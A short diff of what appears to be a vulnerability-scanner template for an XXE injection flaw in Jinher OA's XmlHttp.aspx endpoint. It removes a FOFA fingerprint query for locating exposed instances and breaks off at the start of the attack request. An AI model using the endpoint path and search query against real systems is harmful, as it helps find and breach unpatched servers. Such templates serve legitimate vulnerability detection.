@@ -3,12 +3,8 @@ info:
   name: 金和OA XmlHttp.aspx 存在XML外部实体注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lzsmty5a6d7h92bi'
+  description: ''
   tags: other,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lzsmty5a6d7h92bi
-    fofa: title="金和协同管理平台" || body="js/PasswordCommon.js" || body="js/PasswordNew.js" || body="Jinher Network" || (body="c6/Jhsoft.Web.login" && body="CloseWindowNoAsk") || header="Path=/jc6" || (body="JC6金和协同管
 http:
 - raw:
   - 'POST /c6/Jhsoft.Web.Accept/XmlHttp.aspx/ HTTP/1.1
